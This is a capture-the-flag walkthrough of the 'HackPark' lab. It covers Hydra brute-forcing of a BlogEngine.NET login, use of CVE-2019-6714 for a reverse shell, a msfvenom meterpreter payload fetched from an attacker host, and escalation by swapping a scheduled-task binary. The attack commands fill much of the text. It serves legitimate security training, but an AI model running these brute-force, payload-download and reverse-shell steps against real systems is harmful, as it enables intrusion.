# HackPark

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

### New target start of with a NMAP scan, this one drops ICMP so use no ping (Pn) and standard scripts with service information.

```
~# sudo nmap -Pn -sC -sV <targetIP>
sudo: unable to resolve host ip-<attackBoxIP>: Name or service not known
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-14 18:11 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for <targetIP>
Host is up (0.00084s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2026-04-14T17:11:39+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.88 seconds
```
### Quick gobuster check:
Note: wordlist /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt showed the output below but was not overly interesting. The following gave more significant results but most of no obvious interest: 
/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt.

```
oot@<attackBoxIp>:~# gobuster dir -u <targetIP>:80 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<targetIP>:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 500) [Size: 1208]
/archive              (Status: 200) [Size: 8338]
/content              (Status: 301) [Size: 156] [--> http://<targetIP>:80/content/]
/search               (Status: 200) [Size: 8420]
/account              (Status: 301) [Size: 156] [--> http://<targetIP>:80/account/]
/archives             (Status: 200) [Size: 8339]
/scripts              (Status: 301) [Size: 156] [--> http://<targetIP>:80/scripts/]
/admin                (Status: 302) [Size: 174] [--> http://<targetIP>/Account/login.aspx?ReturnURL=/admin]
/setup                (Status: 302) [Size: 176] [--> http://<targetIP>/Account/login.aspx?ReturnUrl=%2fsetup]
/search2              (Status: 200) [Size: 8421]
/search1              (Status: 200) [Size: 8421]
/default              (Status: 500) [Size: 1763]
/custom               (Status: 301) [Size: 155] [--> http://<targetIP>:80/custom/]
/contacts             (Status: 200) [Size: 9949]
Progress: 4997 / 4998 (99.98%)
/contact              (Status: 200) [Size: 9948]
```

# Task 1: Deploy the vulnerable Windows machine

## Q1 Whats the name of the clown displayed on the homepage?
- Simply copy image check in tineye for reference to image. It was from the Steven King movie it. 
- No interesting information within file discovered using exiftool.

Answer: Pennywise

# Task 2: Using hydra to brute force a login

We need to find a login page to attack and identify what type of request the form is making to the webserver. 
Typically, web servers make two types of requests, a GET request which is used to request data from a webserver 
and a POST request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found here (opens in new tab)).

## Q1 What request type is the Windows website login form using?

Answer: POST, from quick source code check on login page.
```
 <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
```

## Q2 Guess a username, choose a password wordlist and gain credentials to a user account!
- We know its POST request, THM hints username is admin that leaves password to determine.
- Using hydra we can use:
```
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```
- Where the module "http-post-form" is best suited to meet our needs.
- However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more.

### Below is a mini cheatsheet:

Command	Description
- hydra -P <wordlist> -v <ip> <protocol>
	Brute force against a protocol of your choice
- hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>
  	You can use Hydra to bruteforce usernames as well as passwords.
	It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
- hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
  	Attack a Windows Remote Desktop with a password list.
- hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

### Craft a more specific request for Hydra to brute force.

One of easiest ways to find the necessary information is from the use of browser content inspector, under network tabs there we can view the transaction of requests and response from the login of an incorrect password. The alternative was burpe suite which given we know the use name is admin, sending login page to intruder with sniper attack its possible to obtain the password, likely easier. 

This particular example aspx login page is an situation where the server does not evaluate the two paramters: 
- __VIEWSTATE and 
- __EVENTVALIDATION 
In this example expects values which I discovered works for fresh from today, yesterday or from undisclosed time from one I found online. If this were evaluated this would require a fresh pair for each time the login attempt occured.

So if the ASPX login truly enforces VIEWSTATE and EVENTVALIDATION, then Hydra becomes effectively unusable, and Burp Suite becomes the correct tool.

The reason is simple:
- Hydra cannot fetch fresh tokens for every attempt.
- Burp Intruder can reuse or regenerate them depending on how the page behaves.

### What are VIEWSTATE and EVENTVALIDATION: 
- ASP.NET WebForms requires __VIEWSTATE and __EVENTVALIDATION because the framework was designed in the early 2000s to simulate a stateful desktop‑application model on top of the stateless HTTP protocol. These two hidden fields are how the server keeps track of what the page looked like, what controls existed, and what events are allowed when the user submits a form.
When you brute‑force a WebForms login, the server expects:
- the exact __VIEWSTATE for that page load
- the exact __EVENTVALIDATION for that page load
- If either is missing or stale:
	-  the server rejects the POST.
	-  the login code never runs.
	-  Hydra sees no “Login failed”.
	-  the attack fails silently.

### Other field sent in the request for login:
In this example :
- /Account/login.aspx → form action
- ctl00$MainContent$LoginUser$UserName=^USER^ → username placeholder
- ctl00$MainContent$LoginUser$Password=^PASS^ → password placeholder
- ctl00$MainContent$LoginUser$LoginButton=Log+in → submit button value

Response includes text for success of failure, including the information sent in request.
- Login Failed → string that appears on failed login html response.

Inspector in firefox shows us:
```
From the request sent it shows us:
{
	"__VIEWSTATE": "rFM3rsjfogHdqgN8yUgoCrjCFiesc4CPXahN6tO9Tg+RXxvZVXYQ7EyNJEgTVeDOT1aCFJhZRevVnG15z5Ysari8AmhkRw42q1jR2hK8QdhbhXa5qnHNKgX4erSTx6U2R9dMHAqwhucLtUMyATMuEOQsqeu1cR/gG4Cl5vACqDTyQGaL",
	"__EVENTVALIDATION": "KvlXznpFY6MqRWhSmoUxYUQ9BFEeEEGTMswADks1D/jGzo11Ed3hTVYjZZLlrheTTV7STg++WIWjvjF7m7iuq6X3mhUjw8dEM67Sj1rQwvs/K/FiVAJG8u1tYDjKoh39dr184W++tOLDWBOVrwg8yxK/ZFXJHwHLxevrFl99QIWQ6WLM",
	"ctl00$MainContent$LoginUser$UserName": "AAAAAAAA",
	"ctl00$MainContent$LoginUser$Password": "BBBBBBBBBB",
	"ctl00$MainContent$LoginUser$LoginButton": "Log+in"
}

The response HTML contained this information above from request but also included "Login Failed" along with information from the request sent.
<!DOCTYPE html>
<html lang="en">
<head id="Head1"><script type="text/javascript">//<![CDATA[
var accountResources={ 
passwordIsRequried: "Password is required",
emailIsRequired: "Email is required",
emailIsInvalid: "Email is invalid",
userNameIsRequired: "User name is required",
newAndConfirmPasswordMismatch: "New and confirm passwords do not match",
confirmPasswordIsRequired: "Confirm password is required",
oldPasswordIsRequired: "Old password is required",
newPasswordIsRequired: "New password is required",
passwordAndConfirmPasswordIsMatch: "New and confirm passwords do not match",
minPassLengthInChars: "Minimum password length is {0} characters"
 }; 
//]]>
</script><title>
	Account Login
</title><meta name="description" content="Account Login Membership User Password" /><link href="http://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet" type="text/css" /><link href="account.css" rel="stylesheet" />
    <script src="../Scripts/jquery-2.1.4.min.js"></script>
    <script type="text/javascript" src="account.js"></script>
    <meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" /><meta name="apple-mobile-web-app-capable" content="yes" /><meta name="apple-mobile-web-app-status-bar-style" content="black" /><meta name="format-detection" content="telephone=no" /><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>
<body class="ltr">
    <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="YVnwqmnL4hoibg7RWnyQVWb2LulOuPHebzcw7xWc9L7qD/PIXz0xqBvoRkqZJG7e7QpR/+g4gXrLW4ImwUaGI0xh5miTkIHu27vsAzUXWFzj54FYk8ZpMrzykbL8CnhjfuG1C1VR9p+Gb87h1SI1UgUS6rJQ27izjjs3sJhar4iqOL11N+KxAGdrClzeoMBS+IVLuQkM595chabRsKgjifqbV76LeiChXvTY4Zn/3pG/lEw+QX3jklWGtNVXT1e2yAZxkzsQbRgyXYwuh216wtDZSn3MsPf0Wi0iQSMIemPx/gIBsFSObqzD+65XE7xfHFtEbHU35ZmqSmkA2sYkeT0ZyK6HhqoqGM0kqjExaHuMZ3iP" />
</div>

<div class="aspNetHidden">

	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="KJ4S/xPYQcq4wUIqoWQXWKQS3t3OMJ/n/A4CAaypymKPsM2ET6qFLoWw6rZUfK7Dwz5JVWs+0VXhwzNJqJvb4GmQTOT8VSGyL5QZRMt9yBkol9K7E/2AqY+AnltdTLNDKCw5dyTD/Ir64ezPSM+XxGZMZSFzGKAP6Elb5GSUcj4sorA7" />
</div>
        <div class="account">
            <div class="account-header text-center">
                <a href="https://blogengine.io/" target="_blank">
                    <img alt="BlogEngine.NET" src="../Content/images/blog/logo.png" /></a>
            </div>
             <div id="StatusBox">
                    <div id="AdminStatus" class="warning">Login failed<a href="javascript:HideStatus()" style="width:20px;float:right">X</a></div>
                </div>
            <div class="account-box">
                
    
            <h1 class="account-title">
                <span id="lblTitle">Log in</span>
            </h1>
            <div class="account-body">
                <div class="form-group">
                    <label>Username</label>
                    <input name="ctl00$MainContent$LoginUser$UserName" type="text" value="AAAAAAAAA" id="UserName" class="textEntry ltr-dir" />
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input name="ctl00$MainContent$LoginUser$Password" type="password" id="Password" class="passwordEntry ltr-dir" />
                </div>
                <div class="form-group with-icon">
                    <span class="icon-form-group">
                        <input id="RememberMe" type="checkbox" name="ctl00$MainContent$LoginUser$RememberMe" /></span>
                    <label for="RememberMe" id="RememberMeLabel" class="label-title ">Keep me logged in</label>
                </div>
                <input type="submit" name="ctl00$MainContent$LoginUser$LoginButton" value="Log in" onclick="return ValidateLogin();" id="LoginButton" class="btn btn-success btn-block btn-lg" />
                <div class="small-link ">
                    <a id="linkForgotPassword" class="text-muted" href="/Account/password-retrieval.aspx">Forgot your password?</a>
                </div>
            </div>

        
    
    <script type="text/javascript">
        $(document).ready(function () {
            $("input[name$='UserName']").focus();
        });
    </script>

            </div>
        </div>
    </form>
</body>
</html>
```


## Building the Hydra module

### Hydra syntax for web forms:
```
hydra -l USER -P passlist.txt <IP> http-post-form "<path>:<params>:<failure string>" -f
```
For your login form:
```
hydra -l admin -P passwords.txt <TARGET_IP> -V http-post-form \
'/Account/login.aspx? ReturnURL=%2fadmin%2f:__VIEWSTATE=YVnwqmnL4hoibg7RWnyQVWb2LulOuPHebzcw7xWc9L7qD/PIXz0xqBvoRkqZJG7e7QpR/+g4gXrLW4ImwUaGI0xh5miTkIHu27vsAzUXWFzj54FYk8ZpMrzykbL8CnhjfuG1C1VR9p+Gb87h1SI1UgUS6rJQ27izjjs3sJhar4iqOL11N+KxAGdrClzeoMBS+IVLuQkM595chabRsKgjifqbV76LeiChXvTY4Zn/3pG/lEw+QX3jklWGtNVXT1e2yAZxkzsQbRgyXYwuh216wtDZSn3MsPf0Wi0iQSMIemPx/gIBsFSObqzD+65XE7xfHFtEbHU35ZmqSmkA2sYkeT0ZyK6HhqoqGM0kqjExaHuMZ3iP&__EVENTVALIDATION=KJ4S/xPYQcq4wUIqoWQXWKQS3t3OMJ/n/A4CAaypymKPsM2ET6qFLoWw6rZUfK7Dwz5JVWs+0VXhwzNJqJvb4GmQTOT8VSGyL5QZRMt9yBkol9K7E/2AqY+AnltdTLNDKCw5dyTD/Ir64ezPSM+XxGZMZSFzGKAP6Elb5GSUcj4sorA7&ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:Login Failed' -f
```
The browser converts from this to percentage encoded on transit, we need to change required sections for percentage encoding.

- Note that burpe suite these two parameters EVENTVALIDATION and VIEWSTATE are in the correct format and can be save time on changing them to percentage encoding.

Percentage encoding required here so we need to change:
$ → %24
+ → %2B
/ → %2F
= → %3D

and -V is required before the method used.
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt <targetIP> -V http-form-post '/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=YVnwqmnL4hoibg7RWnyQVWb2LulOuPHebzcw7xWc9L7qD%2FPIXz0xqBvoRkqZJG7e7QpR%2F%2Bg4gXrLW4ImwUaGI0xh5miTkIHu27vsAzUXWFzj54FYk8ZpMrzykbL8CnhjfuG1C1VR9p%2BGb87h1SI1UgUS6rJQ27izjjs3sJhar4iqOL11N%2BKxAGdrClzeoMBS%2BIVLuQkM595chabRsKgjifqbV76LeiChXvTY4Zn%2F3pG%2FlEw%2BQX3jklWGtNVXT1e2yAZxkzsQbRgyXYwuh216wtDZSn3MsPf0Wi0iQSMIemPx%2FgIBsFSObqzD%2B65XE7xfHFtEbHU35ZmqSmkA2sYkeT0ZyK6HhqoqGM0kqjExaHuMZ3iP&__EVENTVALIDATION=KJ4S%2FxPYQcq4wUIqoWQXWKQS3t3OMJ%2Fn%2FA4CAaypymKPsM2ET6qFLoWw6rZUfK7Dwz5JVWs%2B0VXhwzNJqJvb4GmQTOT8VSGyL5QZRMt9yBkol9K7E%2F2AqY%2BAnltdTLNDKCw5dyTD%2FIr64ezPSM%2BXxGZMZSFzGKAP6Elb5GSUcj4sorA7
&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed' -f
```
Results from running hydra:
```
...
[ATTEMPT] target <AttackBoxIp> - login "admin" - pass "cheeky" - 1597 of 14344398 [child 8] (0/0)
[80][http-post-form] host: <AttackBoxIp>   login: admin   password: 1qaz2wsx
[STATUS] attack finished for <AttackBoxIp> (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-13 20:19:08
root@<AttackBoxIp>:~# 
```
Answer: 1qaz2wsx

# Task 3 Compromise the Machine

Next using exploit-db and version of the BlogEngine we will exploit to gain initial windows access.

## Q1 After logging in obtain the verion for BlogEngine used:

Answer: 3.3.6.0 This is obtained from hamburger menu -> about -> here you obtain informatoin about BlogEngine.NET 

## Q2 Use the exploit database archive (http://www.exploit-db.com/) to find an exploit to gain a reverse shell on this system. What is the CVE?

Visiting exploint-db.com: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution is shown. 

Answer: CVE: 2019-6714

### Using exploit to gain initial access to the server:

The exploit is available on the website above by simple "blogengine" search. Here is the process to use it:

- Make a copy of exploit on page save with name and extension exactly as PostView.ascx.
- Open a netcat listener
- Change IP and port in exploit to link with netcat listener. 
- After login with admin account details,
	- Select the hamburger on top left.
 	- Select 'Content'
  	- Select 'Posts' (should only be one 'Welcome to HackPark')
  	- This should allow editing of the Welcome page, select the folder which represents file manager on the right side. Here we upload the PostView.ascx exploit we just copied from the exploit-db.com website. This should appear next to Welcome page image. Then trigger the exploit as stated in the notation section of the exploit through changing url bar themes location.
  	- url bar should look like http://<targetIP>/?theme=../../App_Data/files
  	- BlogEngine looks inside that folder for the theme’s .ascx files, including PostView.ascx, and compiles and executes it as server‑side code, which links to netcat listener setup.

From the exploit itself basic instruction:
```
* /Custom/Controls/PostList.ascx.cs
 *
 * Attack:
 *
 * First, we set the TcpClient address and port within the method below to 
 * our attack host, who has a reverse tcp listener waiting for a connection.
 * Next, we upload this file through the file manager.  In the current (3.3.6)
 * version of BlogEngine, this is done by editing a post and clicking on the 
 * icon that looks like an open file in the toolbar.  Note that this file must
 * be uploaded as PostView.ascx. Once uploaded, the file will be in the
 * /App_Data/files directory off of the document root. The admin page that
 * allows upload is:
 *
 * http://10.10.10.10/admin/app/editor/editpost.cshtml
 *
 *
 * Finally, the vulnerability is triggered by accessing the base URL for the 
 * blog with a theme override specified like so:
 *
 * http://10.10.10.10/?theme=../../App_Data/files
 *
 */
```
 
  	  
- Next save, then selec "GO TO POST" this should activate the reverse shell back to the listener started earlier. Then trigger exploit using the 'theme' address component on IP of target.
- Then have a look at current suer with whoami

## Q3 Who is the webserver running as? Determined with whoami command at prompt
```
root@<attackbox>:~# nc -lp 4445
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
c:\whoami
```
Answer: iis apppool\blog 

# Task 4 Windows Privilege Escalation

## Q1 First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.
Answer: none required.
Tip:You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!

Here a more stable reverse shell is the goal that from the exploit so a msfvenom meterpreter payload is required for a windows system:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f exe > shell.exe
```
Then setup a simple server in that directory, ideally use a common port that is in use like 443, but for now default port 8000 is fine.

Then upload the exploit to the target and check it arrived:
```
c:\Windows\Temp> powershell -c "Invoke-WebRequest -Uri 'http://<AttackBoxIP>:8000/shell.exe' -Outfile 'c:\windows\temp\shell.exe'"
c:\Windows\Temp>dir shell.*
...
04/19/2026  12:41 PM            73,802 shell.exe
```

Start metasploit console and prepare a listener for the exploit (must be windows/meterpreter/reverse_tcp same as msfvenom payload):
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST <AttackBoxIP>
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on <AttackBoxIP>:4444 
```

Next upload winPEAS to target similarly start a python3 server in directory with the exploit.
Then use a simple powershell command to upload winPEAS to target:
File transferred successfully after changing port 8000 to 6000 even though previous server was closed.
```
root@ip-<AttackBoxIP>:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server 6000
Serving HTTP on 0.0.0.0 port 6000 (http://0.0.0.0:6000/) ...
<targetIP> - - [19/Apr/2026 21:13:24] "GET /winPEAS.bat HTTP/1.1" 200 -
```
File obtained similarly to before with Invoke-WebRequest:
```
powershell -c "Invoke-WebRequest -Uri 'http://<AttackBoxIP>:6000/winPEAS.bat' -Outfile 'c:\windows\temp\winPEAS.bat'
```

Output when winPEAS is run will run off the screen so save to file from the directory its uploaded to:
```
c:\windows\temp\winPEAS.bat > output.txt
```
Then download from meterpreter using: download <remote_path> <local_path> 
In this case:
```
meterpreter> download C:\\Windows\\Temp\\output.txt /home/kali/CTF/HackPark/
```

Its worth noting upload similar way except it does not work possibly due to EDR or antivirus or limitations of the THM target.
That is using: upload <remote_path> <local_path> 

## Q2 What is the OS version of this windows machine?
This can be obtained from winPEAS output.txt file or just typing sysinfo in meterpreter. Hint suggests use metasploit 'sysinfo'
```
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```

Answer: Windows 2012 R2 (6.3 Build 9600)

## Q3 Can you spot a service running some automated task that could be easily exploited? What is the name of this service?
This is where winPEAS output is used. Look in "[+] RUNNING PROCESSES" section or just running ps from meterpreter prompt and scrolling down.

Answer: WindowsScheduler  

## Q4 What is the name of the binary you're supposed to exploit?
This requires digging deeper in the WindowsSchedular
```
meterpreter > cd "program files (x86)"
meterpreter > dir
Listing: c:\program files (x86)
===============================

Mode          Size  Type  Last modified           Name
----          ----  ----  -------------           ----
...
040777/rwxrw  8192  dir   2019-08-04 12:37:02 +0  SystemScheduler
...
meterpreter > cd systemscheduler
meterpreter > cd events
meterpreter > pwd
c:\program files (x86)\systemscheduler\events
meterpreter > dir
Listing: c:\program files (x86)\systemscheduler\events
======================================================

Mode         		   Size   Type  Last modified          Name
----          		   ----   ----  -------------          ----
100666/rw-rw-rw- 0100  1961   fil   2026-04-20 19:45:34 +  20198415519.INI
100666/rw-rw 0100      32045  fil   2026-04-20 19:45:34 +  20198415519.INI_LOG.t
100666/rw-rw 0100      290    fil   2020-10-02 22:50:12 +  2020102145012.INI
100666/rw-rw 0100      186    fil   2026-04-20 19:42:25 +  Administrator.flg
100666/rw-rw 0100      182    fil   2026-04-20 19:42:23 +  SYSTEM_svc.flg
100666/rw-rw 0100      0      fil   2026-04-20 18:00:30 +  Scheduler.flg
100666/rw-rw 0100      449    fil   2026-04-20 19:42:25 +  SessionInfo.flg
100666/rw-rw 0100      0      fil   2026-04-20 19:45:20 +  service.flg
```
Here quick looks shows that 20198415519.INI_LOG.txt is of interest with message.exe running every minute.
Answer: message.exe

```
meterpreter > head 20198415519.INI_LOG.txt 
04/20/26 11:43:02,Event Started Ok, (Administrator)
04/20/26 11:43:33,Process Ended. PID:4076,ExitCode:4,Message.exe (Administrator)
04/20/26 11:44:02,Event Started Ok, (Administrator)
04/20/26 11:44:33,Process Ended. PID:2516,ExitCode:4,Message.exe (Administrator)
04/20/26 11:45:03,Event Started Ok, (Administrator)
04/20/26 11:45:34,Process Ended. PID:1432,ExitCode:4,Message.exe (Administrator)
04/20/26 11:46:02,Event Started Ok, (Administrator)
04/20/26 11:46:33,Process Ended. PID:1540,ExitCode:4,Message.exe (Administrator)
04/20/26 11:47:02,Event Started Ok, (Administrator)
04/20/26 11:47:33,Process Ended. PID:2140,ExitCode:4,Message.exe (Administrator)
meterpreter > 
```
Q5 Using this interesting service, escalate your privileges! What is the user flag (on Jeffs Desktop)?
First we need to replace this service that is called each minute with the shell.exe. If a scheduled task runs a file with elevated privileges, and is replaced, the scheduled task will run the new file with the same elevated privileges. Steps to take now:
- rename message.exe message.bak
- rename shell.exe message.exe
- Then let message.exe run from scheduled task, backgrounding meterpreter shell and restarting the listener to allow it to reconnect from this new files location.

## Two ways to run the powershell command one is:
```
meterpreter> shell
c:\Program Files (x86)\systemscheduler\> powershell -c "Invoke-WebRequest -Uri 'http://<AttackBoxIP>:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\events\shell.exe'
```
Or first load powershell to get powershell prompt: 
```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS>
```

Since the previous one already done I used powershell method instead.
```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > cd "c:\program files (x86)\SystemScheduler\"
PS > dir mes*
    Directory: C:\program files (x86)\SystemScheduler
Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         3/25/2018  10:58 AM     536992 Message.exe
...
PS > ren message.exe message.bak
PS > dir mes*
...
-a---         3/25/2018  10:58 AM     536992 message.bak
...
PS > Invoke-WebRequest -Uri 'http://<AttackBoxIP>:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\message.exe'
PS > dir mes* 
    Directory: C:\program files (x86)\SystemScheduler
Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         3/25/2018  10:58 AM     536992 message.bak
-a---         4/21/2026  11:57 AM      73802 message.exe
```
Rerun the the listener exploit/multi/handler:
```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on <AttackBoxIP>:4444 
[*] Sending stage (177734 bytes) <TargetIP>
[*] Meterpreter session 2 opened (<AttackBoxIP>:4444 -> <TargetIP>:49605) at 2026-04-21 20:08:03 +0100

meterpreter > shell
Process 1712 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1>whoami
whoami

C:\PROGRA~2\SYSTEM~1>echo %username%
echo %username%
Administrator
```

Move to jeffs Desktop to find flag:
```
c:\Users>dir
...
08/03/2019  11:15 AM    <DIR>          .NET v4.5
08/03/2019  11:15 AM    <DIR>          .NET v4.5 Classic
08/05/2019  02:03 PM    <DIR>          Administrator
08/04/2019  11:54 AM    <DIR>          jeff
08/22/2013  08:39 AM    <DIR>          Public
...
c:\Users\jeff\Desktop>dir
...
08/04/2019  11:57 AM                32 user.txt
...
c:\Users\jeff\Desktop>type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39
```
Answer: 759bd8af507517bcfaede78a21a73e39

Q6 Now obtain the root users flag:

Same for Administrator flag:
```
c:\Users\Administrator\Desktop>dir
...
08/04/2019  11:51 AM                32 root.txt
...
c:\Users\Administrator\Desktop>type root.txt
type root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
```
Answer: 7e13d97f05f7ceb9881a3eb3d78d3e72

# Task 5 Privilege Escalation without Metasploit
This time around pivot from netcat to obtain escalated privilege.
## Q1 (no response required) Use use msfvenom and use windows/shell_reverse_tcp to gain a more solid reverse shell connection in a similar way.
## Q2 (no response required) again take advantage of the c:\windows\temp folder.
Pulling up winPEAS again to gain system information, likely already present from earlier section.

## Q3 Using winPeas, what was the Original Install time? (This is date and time)
Answer:8/3/2019, 10:43:23 AM 
WinPEAS, not entirely required as same information obtainable using systeminfo command from windows.
